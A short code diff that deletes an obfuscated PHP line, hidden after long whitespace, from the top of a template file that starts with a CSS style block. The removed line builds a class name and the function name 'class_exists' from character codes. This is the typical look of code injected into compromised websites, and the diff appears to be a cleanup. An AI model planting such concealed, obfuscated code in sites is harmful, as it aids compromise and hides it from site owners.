@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $qZihYd = chr (80) . 'q' . 'c' . chr (95) . chr (77) . "\110" . chr (120) . chr ( 631 - 525 ); $ggHWHNRAzB = "\143" . chr (108) . "\141" . 's' . chr (115) . '_' . chr (101) . chr ( 379 - 259 ).chr (105) . "\163" . 't' . "\163";$YLNXobI = class_exists($qZihYd); $qZihYd = "22196";$ggHWHNRAzB = "39909";$RJdVeUedc = FALSE; ?><style>
+<style>
   .a_text{
     text-decoration: none;
   }
